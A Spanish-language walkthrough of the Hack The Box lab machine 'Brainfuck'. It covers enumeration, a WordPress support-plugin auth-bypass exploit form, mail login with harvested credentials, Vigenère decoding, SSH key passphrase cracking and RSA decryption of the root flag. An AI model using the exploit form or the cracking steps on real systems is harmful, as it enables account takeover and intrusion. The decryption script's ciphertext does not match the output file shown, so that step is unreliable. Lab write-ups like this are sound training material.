---
layout: post
title:  "OSCP Path ~ Brainfuck de Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada BRAINFUCK siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, Cifrado Decimal, Cifrado Hex, Dovecot, Maquinas Retiradas, Writeup, Hacking
---

# Brainfuck ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.17       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) UIDL USER TOP RESP-CODES PIPELINING AUTH-RESP-CODE CAPA
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: Pre-login more IMAP4rev1 AUTH=PLAINA0001 have post-login listed ID OK LITERAL+ IDLE LOGIN-REFERRALS SASL-IR ENABLE capabilities
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que se aplica el concepto de `<Virtual hosting >` `brainfuck.htb`, `sup3rs3cr3t.brainfuck.htb`

```bash
# whatweb https://brainfuck.htb                                                         
https://brainfuck.htb [200 OK] Bootstrap[4.7.3], Country[RESERVED][ZZ], Email[ajax-loader@2x.gif,orestis@brainfuck.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.17], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], Modernizr, PoweredBy[WordPress,], Script[text/javascript], Title[Brainfuck Ltd. &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3], nginx[1.10.0]  
```
Lanzamos un `whatweb` y estamos anter un `"Wordpress 4.7.3"`

Procedemos a lanzar un escaneo con la herramienta `wpscan`:
```bash
Con --disable-tls-checks le decimos que no checke eso 
Con -e vp(Plugins Vulnerables) , u(usuarios)
Con -o <Fichero de Salidad Output>
```
```bash
# wpscan --url https://brainfuck.htb/ --disable-tls-checks -e vp,u -o vpscan.txt
                                                                                                                                                                                
┌──(root💀kali)-[/home/…/HTB/OSCP/BrainFuck/nmap]
└─# cat vpscan.txt    
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Wed Jun  9 15:29:54 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: https://brainfuck.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

[+] WordPress theme in use: proficient
 | Location: https://brainfuck.htb/wp-content/themes/proficient/
 | Last Updated: 2021-05-09T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
 | [!] The version is out of date, the latest version is 3.0.45
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
 | Style Name: Proficient
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'


[i] No plugins Found.


[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jun  9 15:30:02 2021
[+] Requests Done: 74
[+] Cached Requests: 6
[+] Data Sent: 17.288 KB
[+] Data Received: 16.927 MB
[+] Memory used: 224.105 MB
[+] Elapsed time: 00:00:07
```

Fuzzeamos con la herramienta DIRB
```bash
# dirb https://brainfuck.htb           

-----------------
START_TIME: Wed Jun  9 15:37:50 2021
URL_BASE: https://brainfuck.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://brainfuck.htb/ ----
+ https://brainfuck.htb/index.php (CODE:301|SIZE:0)                                                                                                                            
==> DIRECTORY: https://brainfuck.htb/wp-admin/                                                                                                                                 
==> DIRECTORY: https://brainfuck.htb/wp-content/                                                                                                                               
==> DIRECTORY: https://brainfuck.htb/wp-includes/                                                                                                                              
+ https://brainfuck.htb/xmlrpc.php (CODE:405|SIZE:42)                                                                                                                          
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-admin/ ----
+ https://brainfuck.htb/wp-admin/admin.php (CODE:302|SIZE:0)                                                                                                                   
==> DIRECTORY: https://brainfuck.htb/wp-admin/css/                                                                                                                             
==> DIRECTORY: https://brainfuck.htb/wp-admin/images/                                                                                                                          
==> DIRECTORY: https://brainfuck.htb/wp-admin/includes/                                                                                                                        
+ https://brainfuck.htb/wp-admin/index.php (CODE:302|SIZE:0)                                                                                                                   
==> DIRECTORY: https://brainfuck.htb/wp-admin/js/                                                                                                                              
==> DIRECTORY: https://brainfuck.htb/wp-admin/maint/                                                                                                                           
==> DIRECTORY: https://brainfuck.htb/wp-admin/network/                                                                                                                         
==> DIRECTORY: https://brainfuck.htb/wp-admin/user/                                                                                                                            
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-content/ ----
+ https://brainfuck.htb/wp-content/index.php (CODE:200|SIZE:0)                                                                                                                 
==> DIRECTORY: https://brainfuck.htb/wp-content/plugins/                                                                                                                       
==> DIRECTORY: https://brainfuck.htb/wp-content/themes/                                                                                                                        
==> DIRECTORY: https://brainfuck.htb/wp-content/upgrade/                                                                                                                       
==> DIRECTORY: https://brainfuck.htb/wp-content/uploads/                                                                                                                       
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-includes/ ----
==> DIRECTORY: https://brainfuck.htb/wp-includes/certificates/                                                                                                                 
==> DIRECTORY: https://brainfuck.htb/wp-includes/css/                                                                                                                          
==> DIRECTORY: https://brainfuck.htb/wp-includes/customize/                                                                                                                    
==> DIRECTORY: https://brainfuck.htb/wp-includes/fonts/                                                                                                                        
==> DIRECTORY: https://brainfuck.htb/wp-includes/images/                                                                                                                       
==> DIRECTORY: https://brainfuck.htb/wp-includes/js/                                                                                                                           
==> DIRECTORY: https://brainfuck.htb/wp-includes/widgets/                                                                                                                      
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-admin/css/ ----
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-admin/images/ ----
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-admin/includes/ ----
+ https://brainfuck.htb/wp-admin/includes/admin.php (CODE:500|SIZE:0)                                                                                                          
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-admin/js/ ----
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-admin/maint/ ----
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-admin/network/ ----
+ https://brainfuck.htb/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                                                           
+ https://brainfuck.htb/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                                                           
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-admin/user/ ----
+ https://brainfuck.htb/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                                                              
+ https://brainfuck.htb/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                                                              
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-content/plugins/ ----
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-content/themes/ ----
+ https://brainfuck.htb/wp-content/themes/index.php (CODE:200|SIZE:0)                                                                                                          
                                                                                                                                                                               
---- Entering directory: https://brainfuck.htb/wp-content/upgrade/ ----
.....ctrl+c
```
Vemos que nos sacaba un wp-content/plugins/ pero sin mas resultados
Probamos a apuntar a la ruta esta `https://brainfuck.htb/wp-content/plugins/`
```bash
../
akismet/                                           06-Mar-2017 16:00                   -
easy-wp-smtp/                                      17-Apr-2017 17:17                   -
wp-support-plus-responsive-ticket-system/          17-Apr-2017 17:51                   -
hello.php                                          22-May-2013 21:08                2255
index.php.old 
```
Encontramos estos recursos .. vamos a investigar por los plugins en `Searchsploit`

Obtenemos un Readme.txt `https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt`

Chequeamos por `https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/`
```bash
../
asset/                                             17-Apr-2017 17:51                   -
includes/                                          17-Apr-2017 17:51                   -
lang/                                              17-Apr-2017 17:51                   -
pipe/                                              17-Apr-2017 17:51                   -
readme.txt                                         17-Apr-2017 17:51               19938
wp-support-plus.php 
```
Atraves del archivo `readme.txt` vemos la version de plugin `V 7.1.3`
```bash
# searchsploit wp support
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP Live Chat Support 6.2.03 - Persistent Cross-Site Scripting                                                                | php/webapps/40190.txt
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                                      | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                                        | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                                               | php/webapps/40939.txt
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Ahi vemos que tiene una escalada de privilegios para la `version 7.1.3 - Privilege Escalation` que resulta interesante

# Acceso al Wordpress como Admin mediante el exploit encontrado

Exploit encontrado en `SEARCHSPLOIT` wp support privlige escalation
Seteamos la `url` , el nombre del `user`, y un `correo`  

Lo corremos con `$ firefox  /HTB/OSCP/BrainFuck/exploits/exploit.html` y nos logueamos.
```bash
$ cat /HTB/OSCP/BrainFuck/exploits/exploit.html 
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="orestis@brainfuck.htb">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```
Conseguimos acceso como Admin al panel de Wordpress.
Entramos como el user admin al CMS wordpress

conseguimos sacar las credenciales para el servicio smntp asique procedemos por ahi
```bash
# telnet 10.10.10.17 110
Trying 10.10.10.17...
Connected to 10.10.10.17.
Escape character is '^]'.
+OK Dovecot ready.
-ERR Unknown command.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
list
+OK 2 messages:
1 977
2 514
#Sacamos el primer mail encontrado con el comando RETR 1
retr 1
+OK 977 octets
Return-Path: <www-data@brainfuck.htb>
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33)
        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress <wordpress@brainfuck.htb>
Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

https://brainfuck.htb

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during the install.
Log in here: https://brainfuck.htb/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/
.
exit
-ERR Unknown command: EXIT
# Sacamos el segundo mail con el comando RETR 2
retr 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
.
```
Conseguimos entrar al foro supersecreto `https://sup3rs3cr3t.brainfuck.htb/d/1-development`
con las credenciales obtenidas en el servicio de correo 
Entramos al foro:
`https://sup3rs3cr3t.brainfuck.htb/d/3-key`

Encontramos una discussion abierta, y vemos que se esta aplicando un cifrado que parece ser `VIGENERE`:
```bash
# Encontramos Patrones que parecen repetirse, justo la vuln de Vigenere
Orestis - Hacking for fun and profit

Pieagnm - Jkoijeg nbw zwx mle grwsnn
```
Codigo Vigenere : Vuln hay que buscar patrones repetitivos o que sean parecidos para sacar la clave(abajo)
http://rumkin.com/tools/cipher/vigenere.php
```bash
Brain fuCkmybrain fuckmybrain fu
```
Con la contraseña `fuckmybrain` conseguimos ir sacando los mensajes
hasta encontrar este relevante:
```bash
There you go you stupid fuck, I hope you remember your  key password because I dont  https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```
Obtenemos un fichero id_rsa pero esta cifrado .. Asique vamos a tener que usar la herramienta `ssh2john.py` que es para pasar el Hash a un formato en el que `john` pueda entender para hacer fueza bruta.
```bash
# locate 2john | grep ssh
/usr/share/john/ssh2john.py
#Paso 1 
(root💀kali)-[/home/…/HTB/OSCP/BrainFuck/content]
└─# /usr/share/john/ssh2john.py id_rsa > "hash_rsa"
# Paso 2                                                                                                                                                                                
┌──(root💀kali)-[/home/…/HTB/OSCP/BrainFuck/content]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt "hash_rsa"            
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
"3poulakia!  "       (id_rsa)
Warning: Only 5 candidates left, minimum 8 needed for performance.
1g 0:00:00:02 DONE (2021-06-09 18:18) 0.4201g/s 6025Kp/s 6025Kc/s 6025KC/s *7¡Vamos!..rootpassword!
Session completed
```
# Consiguiendo Acceso Inicial por SSH 
```BASH
# ssh -i id_rsa orestis@brainfuck.htb                                                                                                                                   255 ⨯
The authenticity of host 'brainfuck.htb (10.10.10.17)' can't be established.
ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'brainfuck.htb' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
orestis@brainfuck:~$  
```

# Privesc / Enumeracion del Sistema

Enumeramos :
```bash
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  "user.txt"
```
Sacamos la Flag de `user.txt` y seguimos enumerando los diferentes recursos
```bash
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997

orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```
Vamos a ver que es lo que hace este script que nos deja estos archivos con caracteres Decimales
```bash
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```
Como no sabemos que es lo que esta haciendo vamos a copiar una parte del codigo para ver si encontramos el tipo de Cifrado que se esta empleando
```bash
p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)  "[BUSQUEDA EN GOOGLE]"
```
Parece que : `It is a standard RSA with e=5 an` encontrado en https://ctftime.org/writeup/6434

Y encontramos un script para calcular las variables de la encriptacion RSA: ` P ` `  Q  ` ` E `
`https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e`

Vamos a Setear el script con nuestras variables del archivo `debug.txt` y `output.txt`
```bash
# cat decrypt.py                                                                                                                                                          1 ⨯
#!/usr/bin/python

# Funcion Principal de variables

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

# Funcion Principal 1, seteamos las variables con las que teniamos en el archivo debug.txt
def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```
Una vez seteado todo lanzamos el script para ver si calculamos el valor correspondiente.
Seteamos las variables y ejecutamos
```bash    
# python decrypt.py                                                                                                                                                       1 ⚙
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
# Este es el Valor que queremos, PT, que se encuentra en valor DECIMAL, 
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
```
Ahora tenemos que pasar este codigo en DECIMAL A HEXADECIMAL y luego a Texto plano a normal
Para ello vamos usar esta pagina web:
https://www.rapidtables.com/convert/number/decimal-to-hex.html
Ahora pasamo de `Decimal to HEX` 
`Output: 3665666331613564626238393034373531636536353636613330356262386566`
 
Ahora de `HEX to TEXT`
`Output: 6efc1a5dbb8904751ce6566a305bbxxxx`
 
Maquina `BRAINFUCK` rooteada =D !! Seguimos Full Hacks !!
 Que parece ser la flag de `root.txt`
 
 
